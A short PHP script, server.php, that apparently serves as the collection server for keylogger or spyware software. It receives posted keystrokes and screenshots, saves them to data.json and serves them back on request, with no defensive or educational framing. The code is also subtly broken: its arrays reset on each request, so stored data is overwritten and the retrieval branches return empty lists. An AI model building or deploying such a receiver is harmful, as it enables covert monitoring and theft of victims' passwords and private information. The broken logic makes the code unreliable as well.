<?php
// server.php

$keystrokes = [];
$screenshots = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['keystrokes'])) {
        $keystrokes[] = $_POST['keystrokes'];
    } elseif (isset($_POST['screenshot'])) {
        $screenshots[] = $_POST['screenshot'];
    }
    file_put_contents('data.json', json_encode(['keystrokes' => $keystrokes, 'screenshots' => $screenshots]));
}

if (isset($_GET['keystrokes'])) {
    echo json_encode($keystrokes);
} elseif (isset($_GET['screenshots'])) {
    echo json_encode($screenshots);
}
?>